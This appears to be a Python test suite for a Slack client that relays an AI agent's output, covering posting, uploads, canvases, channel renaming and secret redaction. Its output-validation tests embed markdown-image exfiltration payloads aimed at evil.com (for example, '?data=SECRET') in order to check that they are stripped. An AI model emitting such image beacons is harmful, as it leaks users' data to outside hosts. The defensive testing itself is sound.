"""Tests for summon_claude.slack.client — SlackClient and helpers."""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, MagicMock

import pytest

from summon_claude.slack.client import (
    ZZZ_PREFIX,
    MessageRef,
    SlackClient,
    redact_secrets,
    sanitize_for_mrkdwn,
)


class TestMessageRef:
    def test_frozen(self):
        from dataclasses import FrozenInstanceError

        ref = MessageRef(channel_id="C123", ts="1234567890.123")
        with pytest.raises(FrozenInstanceError):
            ref.channel_id = "other"  # type: ignore[misc]

    def test_equality(self):
        a = MessageRef(channel_id="C123", ts="1.0")
        b = MessageRef(channel_id="C123", ts="1.0")
        assert a == b

    def test_fields(self):
        ref = MessageRef(channel_id="C456", ts="9.9")
        assert ref.channel_id == "C456"
        assert ref.ts == "9.9"


class TestSanitizeForMrkdwn:
    def test_removes_newlines(self):
        assert sanitize_for_mrkdwn("hello\nworld") == "hello world"

    def test_removes_carriage_returns(self):
        assert sanitize_for_mrkdwn("hello\rworld") == "hello world"

    def test_replaces_backticks_with_single_quote(self):
        assert sanitize_for_mrkdwn("he said `foo`") == "he said 'foo'"

    def test_removes_asterisks(self):
        assert sanitize_for_mrkdwn("**bold**") == "bold"

    def test_truncates_at_max_len(self):
        text = "a" * 200
        result = sanitize_for_mrkdwn(text, max_len=50)
        assert len(result) == 50

    def test_default_max_len_100(self):
        text = "b" * 150
        result = sanitize_for_mrkdwn(text)
        assert len(result) == 100

    def test_short_text_unchanged(self):
        assert sanitize_for_mrkdwn("hello") == "hello"

    def test_empty_string(self):
        assert sanitize_for_mrkdwn("") == ""


class TestSlackClient:
    def _make_client(self) -> tuple[SlackClient, MagicMock]:
        web = MagicMock()
        web.chat_postMessage = AsyncMock(return_value={"channel": "C123", "ts": "1.0"})
        web.chat_postEphemeral = AsyncMock(return_value={})
        web.chat_update = AsyncMock(return_value={})
        web.reactions_add = AsyncMock(return_value={})
        web.reactions_remove = AsyncMock(return_value={})
        web.files_upload_v2 = AsyncMock(return_value={})
        web.conversations_setTopic = AsyncMock(return_value={})
        web.assistant_threads_setStatus = AsyncMock(return_value={})
        client = SlackClient(web, "C123")
        return client, web

    def test_channel_id_attribute(self):
        web = MagicMock()
        client = SlackClient(web, "C456")
        assert client.channel_id == "C456"

    def test_web_is_private(self):
        web = MagicMock()
        client = SlackClient(web, "C456")
        assert not hasattr(client, "web")
        assert hasattr(client, "_web")

    async def test_post_returns_message_ref(self):
        client, web = self._make_client()
        ref = await client.post("hello")
        assert ref == MessageRef(channel_id="C123", ts="1.0")

    async def test_post_preserves_formatting(self):
        client, web = self._make_client()
        await client.post("hello\nworld")
        call_kwargs = web.chat_postMessage.call_args.kwargs
        assert call_kwargs["text"] == "hello\nworld"

    async def test_post_with_thread_ts(self):
        client, web = self._make_client()
        await client.post("hello", thread_ts="9999.0")
        call_kwargs = web.chat_postMessage.call_args.kwargs
        assert call_kwargs["thread_ts"] == "9999.0"

    async def test_post_with_blocks(self):
        client, web = self._make_client()
        blocks = [{"type": "section", "text": {"type": "mrkdwn", "text": "hi"}}]
        await client.post("hello", blocks=blocks)
        call_kwargs = web.chat_postMessage.call_args.kwargs
        assert call_kwargs["blocks"] == blocks

    async def test_post_ephemeral_calls_api(self):
        client, web = self._make_client()
        await client.post_ephemeral("U123", "only for you")
        web.chat_postEphemeral.assert_called_once()
        call_kwargs = web.chat_postEphemeral.call_args.kwargs
        assert call_kwargs["user"] == "U123"
        assert call_kwargs["channel"] == "C123"

    async def test_post_ephemeral_swallows_errors(self):
        client, web = self._make_client()
        web.chat_postEphemeral.side_effect = Exception("api error")
        # Should not raise
        await client.post_ephemeral("U123", "text")

    async def test_update_calls_api(self):
        client, web = self._make_client()
        await client.update("1.0", "updated text")
        web.chat_update.assert_called_once()
        call_kwargs = web.chat_update.call_args.kwargs
        assert call_kwargs["ts"] == "1.0"
        assert call_kwargs["text"] == "updated text"
        assert call_kwargs["channel"] == "C123"

    async def test_react_calls_api(self):
        client, web = self._make_client()
        await client.react("1.0", "white_check_mark")
        web.reactions_add.assert_called_once()
        call_kwargs = web.reactions_add.call_args.kwargs
        assert call_kwargs["name"] == "white_check_mark"
        assert call_kwargs["timestamp"] == "1.0"

    async def test_react_strips_colons(self):
        client, web = self._make_client()
        await client.react("1.0", ":thumbsup:")
        call_kwargs = web.reactions_add.call_args.kwargs
        assert call_kwargs["name"] == "thumbsup"

    async def test_react_swallows_errors(self):
        client, web = self._make_client()
        web.reactions_add.side_effect = Exception("api error")
        # Should not raise
        await client.react("1.0", "thumbsup")

    async def test_upload_calls_api(self):
        client, web = self._make_client()
        await client.upload("file content", "test.py")
        web.files_upload_v2.assert_called_once()
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert call_kwargs["content"] == "file content"
        assert call_kwargs["filename"] == "test.py"
        assert call_kwargs["channel"] == "C123"

    async def test_upload_with_thread_ts(self):
        client, web = self._make_client()
        await client.upload("content", "file.txt", thread_ts="9999.0")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert call_kwargs["thread_ts"] == "9999.0"

    async def test_upload_uses_filename_as_title_when_no_title(self):
        client, web = self._make_client()
        await client.upload("content", "test.py")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert call_kwargs["title"] == "test.py"

    async def test_upload_custom_title(self):
        client, web = self._make_client()
        await client.upload("content", "test.py", title="My Script")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert call_kwargs["title"] == "My Script"

    async def test_upload_with_snippet_type(self):
        client, web = self._make_client()
        await client.upload("diff content", "test.diff", snippet_type="diff")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert call_kwargs["snippet_type"] == "diff"

    async def test_upload_without_snippet_type_omits_key(self):
        client, web = self._make_client()
        await client.upload("content", "test.py")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert "snippet_type" not in call_kwargs

    async def test_set_topic_calls_api(self):
        client, web = self._make_client()
        await client.set_topic("my topic")
        web.conversations_setTopic.assert_called_once()
        call_kwargs = web.conversations_setTopic.call_args.kwargs
        assert call_kwargs["channel"] == "C123"
        assert call_kwargs["topic"] == "my topic"

    async def test_unreact_calls_api(self):
        client, web = self._make_client()
        await client.unreact("1.0", "white_check_mark")
        web.reactions_remove.assert_called_once()
        call_kwargs = web.reactions_remove.call_args.kwargs
        assert call_kwargs["name"] == "white_check_mark"
        assert call_kwargs["timestamp"] == "1.0"
        assert call_kwargs["channel"] == "C123"

    async def test_unreact_strips_colons(self):
        client, web = self._make_client()
        await client.unreact("1.0", ":thumbsup:")
        call_kwargs = web.reactions_remove.call_args.kwargs
        assert call_kwargs["name"] == "thumbsup"

    async def test_unreact_swallows_errors(self):
        client, web = self._make_client()
        web.reactions_remove.side_effect = Exception("api error")
        # Should not raise
        await client.unreact("1.0", "thumbsup")

    async def test_set_thread_status_calls_api(self):
        client, web = self._make_client()
        await client.set_thread_status("1.0", "Thinking...")
        web.assistant_threads_setStatus.assert_called_once()
        call_kwargs = web.assistant_threads_setStatus.call_args.kwargs
        assert call_kwargs["channel_id"] == "C123"
        assert call_kwargs["thread_ts"] == "1.0"
        assert call_kwargs["status"] == "Thinking..."

    async def test_set_thread_status_clear(self):
        client, web = self._make_client()
        await client.set_thread_status("1.0", "")
        call_kwargs = web.assistant_threads_setStatus.call_args.kwargs
        assert call_kwargs["status"] == ""

    async def test_set_thread_status_swallows_errors(self):
        client, web = self._make_client()
        web.assistant_threads_setStatus.side_effect = Exception("api error")
        # Should not raise
        await client.set_thread_status("1.0", "Thinking...")

    async def test_canvas_create_returns_canvas_id(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(return_value={"canvas_id": "F_ABC"})
        result = await client.canvas_create("# Hello")
        assert result == "F_ABC"
        web.api_call.assert_called_once()
        call_args = web.api_call.call_args
        assert call_args[0][0] == "canvases.create"
        assert call_args[1]["json"]["channel_id"] == "C123"

    async def test_canvas_create_fallback_syncs_and_renames(self):
        """Fallback should find existing canvas, sync content, and rename."""
        client, web = self._make_client()
        call_count = 0

        async def api_call_side_effect(method, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "canvases.create":
                raise Exception("plan_limit")
            return {"ok": True}

        web.api_call = AsyncMock(side_effect=api_call_side_effect)
        web.files_list = AsyncMock(return_value={"files": [{"id": "F_EXIST"}]})
        result = await client.canvas_create("# Hello", title="My Canvas")
        assert result == "F_EXIST"
        # Should have called: canvases.create (failed), canvases.edit (sync), canvases.edit (rename)
        assert web.api_call.call_count == 3
        edit_calls = [c for c in web.api_call.call_args_list if c[0][0] == "canvases.edit"]
        assert len(edit_calls) == 2
        # First edit is content replace
        assert edit_calls[0][1]["json"]["changes"][0]["operation"] == "replace"
        # Second edit is rename
        assert edit_calls[1][1]["json"]["changes"][0]["operation"] == "rename"
        assert edit_calls[1][1]["json"]["changes"][0]["title_content"]["markdown"] == "My Canvas"

    async def test_canvas_create_fallback_no_existing(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(side_effect=Exception("fail"))
        web.files_list = AsyncMock(return_value={"files": []})
        result = await client.canvas_create("# Hello")
        assert result is None

    async def test_canvas_sync_success(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(return_value={"ok": True})
        ok = await client.canvas_sync("F_ABC", "# Updated")
        assert ok is True
        call_args = web.api_call.call_args
        assert call_args[0][0] == "canvases.edit"

    async def test_canvas_sync_failure_returns_false(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(side_effect=Exception("rate_limited"))
        ok = await client.canvas_sync("F_ABC", "# Updated")
        assert ok is False

    async def test_canvas_rename_success(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(return_value={"ok": True})
        ok = await client.canvas_rename("F_ABC", "New Title")
        assert ok is True
        call_args = web.api_call.call_args
        assert call_args[0][0] == "canvases.edit"
        change = call_args[1]["json"]["changes"][0]
        assert change["operation"] == "rename"
        assert change["title_content"]["markdown"] == "New Title"

    async def test_canvas_rename_failure_returns_false(self):
        client, web = self._make_client()
        web.api_call = AsyncMock(side_effect=Exception("not_allowed"))
        ok = await client.canvas_rename("F_ABC", "New Title")
        assert ok is False

    async def test_get_canvas_id_returns_first_file(self):
        client, web = self._make_client()
        web.files_list = AsyncMock(return_value={"files": [{"id": "F_FIRST"}]})
        result = await client.get_canvas_id()
        assert result == "F_FIRST"

    async def test_get_canvas_id_returns_none_when_empty(self):
        client, web = self._make_client()
        web.files_list = AsyncMock(return_value={"files": []})
        result = await client.get_canvas_id()
        assert result is None

    async def test_delete_message_calls_chat_delete(self):
        client, web = self._make_client()
        web.chat_delete = AsyncMock(return_value={})
        await client.delete_message("1234567890.123")
        web.chat_delete.assert_called_once()
        call_kwargs = web.chat_delete.call_args.kwargs
        assert call_kwargs["channel"] == "C123"
        assert call_kwargs["ts"] == "1234567890.123"

    async def test_delete_message_swallows_errors(self):
        client, web = self._make_client()
        web.chat_delete = AsyncMock(side_effect=Exception("cant_delete_message"))
        # Should not raise
        await client.delete_message("1234567890.123")

    async def test_post_interactive_returns_message_ref(self):
        client, web = self._make_client()
        blocks = [{"type": "actions", "elements": []}]
        ref = await client.post_interactive("Click a button", blocks=blocks)
        assert ref == MessageRef(channel_id="C123", ts="1.0")
        web.chat_postMessage.assert_called_once()

    async def test_post_interactive_with_thread_ts(self):
        client, web = self._make_client()
        await client.post_interactive("text", thread_ts="9999.0")
        call_kwargs = web.chat_postMessage.call_args.kwargs
        assert call_kwargs["thread_ts"] == "9999.0"

    async def test_get_canvas_id_returns_none_on_error(self):
        client, web = self._make_client()
        web.files_list = AsyncMock(side_effect=Exception("api error"))
        result = await client.get_canvas_id()
        assert result is None


class TestRedactSecrets:
    def test_classic_pat_redacted(self):
        text = "Error: auth failed with ghp_abc123XYZ token"
        assert "[REDACTED]" in redact_secrets(text)
        assert "ghp_abc123XYZ" not in redact_secrets(text)

    def test_fine_grained_pat_redacted(self):
        text = "Token github_pat_11ABCDEF_xyz789 is invalid"
        assert "[REDACTED]" in redact_secrets(text)
        assert "github_pat_11ABCDEF_xyz789" not in redact_secrets(text)

    def test_oauth_token_redacted(self):
        text = "Error: gho_abc123XYZ token expired"
        assert "[REDACTED]" in redact_secrets(text)
        assert "gho_abc123XYZ" not in redact_secrets(text)

    def test_user_to_server_token_redacted(self):
        text = "Error: ghu_usertoken456 expired"
        assert "[REDACTED]" in redact_secrets(text)
        assert "ghu_usertoken456" not in redact_secrets(text)

    def test_app_installation_token_redacted(self):
        text = "Error: ghs_installtoken456 forbidden"
        assert "[REDACTED]" in redact_secrets(text)
        assert "ghs_installtoken456" not in redact_secrets(text)

    def test_app_refresh_token_redacted(self):
        text = "Error: ghr_refreshtoken789 invalid"
        assert "[REDACTED]" in redact_secrets(text)
        assert "ghr_refreshtoken789" not in redact_secrets(text)

    def test_no_pat_unchanged(self):
        text = "Normal message without any tokens"
        assert redact_secrets(text) == text

    def test_multiple_pats_redacted(self):
        text = "Found ghp_first and github_pat_second tokens"
        result = redact_secrets(text)
        assert "ghp_first" not in result
        assert "github_pat_second" not in result
        assert result.count("[REDACTED]") == 2

    def test_atlassian_jwt_redacted(self):
        # Realistic Atlassian JWT: "eyJhbGci" prefix + 20+ chars
        jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature"
        text = f"Bearer {jwt} in header"
        result = redact_secrets(text)
        assert jwt not in result
        assert "[REDACTED]" in result

    def test_short_base64_not_redacted(self):
        # Short "eyJhbGci" fragment (under 20-char suffix) must NOT be redacted
        text = "eyJhbGciShort is just data"
        assert redact_secrets(text) == text

    async def test_post_redacts_pat(self):
        web = MagicMock()
        web.chat_postMessage = AsyncMock(return_value={"channel": "C123", "ts": "1.0"})
        client = SlackClient(web, "C123")
        await client.post("Error with ghp_secret123 token")
        call_kwargs = web.chat_postMessage.call_args.kwargs
        assert "ghp_secret123" not in call_kwargs["text"]
        assert "[REDACTED]" in call_kwargs["text"]

    async def test_post_ephemeral_redacts_pat(self):
        web = MagicMock()
        web.chat_postEphemeral = AsyncMock(return_value={})
        client = SlackClient(web, "C123")
        await client.post_ephemeral("U_USER", "Token: ghp_ephemeral_secret")
        call_kwargs = web.chat_postEphemeral.call_args.kwargs
        assert "ghp_ephemeral_secret" not in call_kwargs["text"]
        assert "[REDACTED]" in call_kwargs["text"]

    async def test_update_redacts_pat(self):
        web = MagicMock()
        web.chat_update = AsyncMock(return_value={})
        client = SlackClient(web, "C123")
        await client.update("1.0", "Token: github_pat_leaked123")
        call_kwargs = web.chat_update.call_args.kwargs
        assert "github_pat_leaked123" not in call_kwargs["text"]
        assert "[REDACTED]" in call_kwargs["text"]

    async def test_post_redacts_blocks(self):
        web = MagicMock()
        web.chat_postMessage = AsyncMock(return_value={"channel": "C123", "ts": "1.0"})
        client = SlackClient(web, "C123")
        blocks = [
            {"type": "section", "text": {"type": "mrkdwn", "text": "Token: ghp_blocktoken123"}}
        ]
        await client.post("fallback", blocks=blocks)
        sent_blocks = web.chat_postMessage.call_args.kwargs["blocks"]
        assert "ghp_blocktoken123" not in json.dumps(sent_blocks)
        assert "[REDACTED]" in json.dumps(sent_blocks)

    async def test_upload_redacts_content(self):
        web = MagicMock()
        web.files_upload_v2 = AsyncMock(return_value={})
        client = SlackClient(web, "C123")
        await client.upload("config: ghp_uploadtoken456", "config.txt")
        call_kwargs = web.files_upload_v2.call_args.kwargs
        assert "ghp_uploadtoken456" not in call_kwargs["content"]
        assert "[REDACTED]" in call_kwargs["content"]

    async def test_set_topic_redacts(self):
        web = MagicMock()
        web.conversations_setTopic = AsyncMock(return_value={})
        client = SlackClient(web, "C123")
        await client.set_topic("Topic with ghp_topictoken789")
        call_kwargs = web.conversations_setTopic.call_args.kwargs
        assert "ghp_topictoken789" not in call_kwargs["topic"]


# ---------------------------------------------------------------------------
# zzz- rename: ZZZ_PREFIX constant + SlackClient.rename_channel
# ---------------------------------------------------------------------------


class TestZzzPrefix:
    def test_zzz_prefix_value(self):
        """ZZZ_PREFIX module constant must be exactly 'zzz-'."""
        assert ZZZ_PREFIX == "zzz-"

    def test_zzz_make_zzz_name_short(self):
        """make_zzz_name prepends zzz- to short names."""
        from summon_claude.slack.client import make_zzz_name

        assert make_zzz_name("myproj-abc") == "zzz-myproj-abc"

    def test_zzz_make_zzz_name_truncates_to_80(self):
        """make_zzz_name truncates so result is at most 80 chars."""
        from summon_claude.slack.client import make_zzz_name

        long_name = "a" * 80
        result = make_zzz_name(long_name)
        assert len(result) == 80
        assert result.startswith("zzz-")
        assert result == "zzz-" + "a" * 76


class TestZzzRenameChannel:
    def _make_client(self, channel_id: str = "C123") -> tuple[SlackClient, MagicMock]:
        web = MagicMock()
        web.conversations_rename = AsyncMock(
            return_value={"channel": {"name": "zzz-chan", "id": channel_id}}
        )
        return SlackClient(web, channel_id), web

    async def test_zzz_rename_channel_success_returns_name(self):
        """rename_channel returns normalized name from Slack on success."""
        web = MagicMock()
        web.conversations_rename = AsyncMock(
            return_value={"channel": {"name": "zzz-myproj", "id": "C123"}}
        )
        client = SlackClient(web, "C123")
        result = await client.rename_channel("zzz-myproj")
        assert result == "zzz-myproj"
        web.conversations_rename.assert_awaited_once_with(channel="C123", name="zzz-myproj")

    async def test_zzz_rename_channel_name_taken_returns_none(self):
        """rename_channel returns None when Slack raises name_taken (logs warning)."""
        web = MagicMock()
        web.conversations_rename = AsyncMock(side_effect=Exception("name_taken"))
        client = SlackClient(web, "C123")
        result = await client.rename_channel("zzz-taken")
        assert result is None

    async def test_zzz_rename_channel_generic_error_returns_none(self):
        """rename_channel returns None on any exception (logs warning, never raises)."""
        web = MagicMock()
        web.conversations_rename = AsyncMock(side_effect=RuntimeError("unexpected"))
        client = SlackClient(web, "C456")
        result = await client.rename_channel("zzz-whatever")
        assert result is None

    async def test_zzz_rename_channel_passes_channel_id(self):
        """rename_channel uses the client's own channel_id, not a parameter."""
        web = MagicMock()
        web.conversations_rename = AsyncMock(
            return_value={"channel": {"name": "zzz-x", "id": "C999"}}
        )
        client = SlackClient(web, "C999")
        await client.rename_channel("zzz-x")
        call_kwargs = web.conversations_rename.call_args.kwargs
        assert call_kwargs["channel"] == "C999"


class TestZzzMakeZzzNameIdempotency:
    def test_zzz_make_zzz_name_already_prefixed(self):
        """make_zzz_name is idempotent — already-prefixed names are not double-prefixed."""
        from summon_claude.slack.client import make_zzz_name

        assert make_zzz_name("zzz-myproj-abc") == "zzz-myproj-abc"

    def test_zzz_make_zzz_name_already_prefixed_long(self):
        """make_zzz_name truncates already-prefixed names to 80 chars."""
        from summon_claude.slack.client import make_zzz_name

        long_name = "zzz-" + "a" * 80
        result = make_zzz_name(long_name)
        assert len(result) == 80
        assert result.startswith("zzz-")


class TestOutputValidation:
    @pytest.mark.asyncio
    async def test_post_strips_markdown_images(self):
        """SlackClient.post() must strip markdown images from output."""
        mock_web = AsyncMock()
        mock_web.chat_postMessage = AsyncMock(return_value={"ts": "1234", "channel": "C123"})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.post("Here is data: ![stolen](https://evil.com/steal?data=SECRET)")

        call_args = mock_web.chat_postMessage.call_args
        posted_text = call_args.kwargs.get("text", "")
        assert "![stolen]" not in posted_text
        assert "[image removed by security filter]" in posted_text

    @pytest.mark.asyncio
    async def test_update_strips_markdown_images(self):
        mock_web = AsyncMock()
        mock_web.chat_update = AsyncMock(return_value={})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.update("1234", "Check ![img](https://evil.com/track)")

        call_args = mock_web.chat_update.call_args
        posted_text = call_args.kwargs.get("text", "")
        assert "![img]" not in posted_text
        assert "[image removed by security filter]" in posted_text

    @pytest.mark.asyncio
    async def test_post_ephemeral_strips_markdown_images(self):
        """SlackClient.post_ephemeral() must strip markdown images from output."""
        mock_web = AsyncMock()
        mock_web.chat_postEphemeral = AsyncMock(return_value={})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.post_ephemeral("U123", "Data: ![stolen](https://evil.com/steal)")

        call_args = mock_web.chat_postEphemeral.call_args
        posted_text = call_args.kwargs.get("text", "")
        assert "![stolen]" not in posted_text
        assert "[image removed by security filter]" in posted_text

    @pytest.mark.asyncio
    async def test_upload_strips_markdown_images(self):
        """SlackClient.upload() must strip markdown images from content."""
        mock_web = AsyncMock()
        mock_web.files_upload_v2 = AsyncMock(return_value={})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.upload("Content: ![img](https://evil.com/track)", "file.txt")

        call_args = mock_web.files_upload_v2.call_args
        posted_content = call_args.kwargs.get("content", "")
        assert "![img]" not in posted_content
        assert "[image removed by security filter]" in posted_content

    @pytest.mark.asyncio
    async def test_set_topic_strips_markdown_images(self):
        """SlackClient.set_topic() must strip markdown images."""
        mock_web = AsyncMock()
        mock_web.conversations_setTopic = AsyncMock(return_value={})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.set_topic("Status: ![img](https://evil.com/track)")

        call_args = mock_web.conversations_setTopic.call_args
        posted_topic = call_args.kwargs.get("topic", "")
        assert "![img]" not in posted_topic
        assert "[image removed by security filter]" in posted_topic

    @pytest.mark.asyncio
    async def test_canvas_create_strips_markdown_images(self):
        """SlackClient.canvas_create() must strip markdown images from content."""
        mock_web = AsyncMock()
        mock_web.api_call = AsyncMock(return_value={"canvas_id": "F_ABC"})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.canvas_create("Content: ![img](https://evil.com/track)")

        call_args = mock_web.api_call.call_args
        md = call_args.kwargs["json"]["document_content"]["markdown"]
        assert "![img]" not in md
        assert "[image removed by security filter]" in md

    @pytest.mark.asyncio
    async def test_canvas_sync_strips_markdown_images(self):
        """SlackClient.canvas_sync() must strip markdown images from content."""
        mock_web = AsyncMock()
        mock_web.api_call = AsyncMock(return_value={})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.canvas_sync("F_ABC", "Data: ![img](https://evil.com/track)")

        call_args = mock_web.api_call.call_args
        md = call_args.kwargs["json"]["changes"][0]["document_content"]["markdown"]
        assert "![img]" not in md
        assert "[image removed by security filter]" in md

    @pytest.mark.asyncio
    async def test_clean_text_passes_through(self):
        mock_web = AsyncMock()
        mock_web.chat_postMessage = AsyncMock(return_value={"ts": "1234", "channel": "C123"})
        client = SlackClient(web_client=mock_web, channel_id="C123")

        await client.post("Normal text with [link](https://example.com)")

        call_args = mock_web.chat_postMessage.call_args
        posted_text = call_args.kwargs.get("text", "")
        assert "[link](https://example.com)" in posted_text
